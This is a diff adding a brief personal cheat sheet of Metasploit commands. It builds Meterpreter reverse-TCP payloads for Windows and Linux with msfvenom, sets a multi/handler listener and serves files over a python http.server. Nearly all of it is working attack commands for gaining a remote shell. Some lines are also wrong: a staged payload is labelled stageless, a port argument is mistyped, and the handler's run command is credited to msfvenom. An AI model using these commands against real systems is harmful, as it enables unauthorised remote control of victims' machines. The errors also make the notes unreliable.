@@ -1,0 +1,21 @@
+msfvenom windows command 
+set the main payload - (small stager first and and then main payload)
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.134 lport=4444 -f exe > shell.exe
+also set the stageless
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.134 lport=4444 -f exe > stageless.exe
+
+command for the linux
+msfvenom -p linux/meterpreter/reverse_tcp lhost=192.168.20.134 lport-5555 -f elf > linux.elf
+
+use the metasploit exploit(multi/handler) 
+
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost
+set lport (example 5555)
+
+set the python3 server
+python3 -m http.server
+run msfvenom by typing "run" or "exploit"
+
+
+
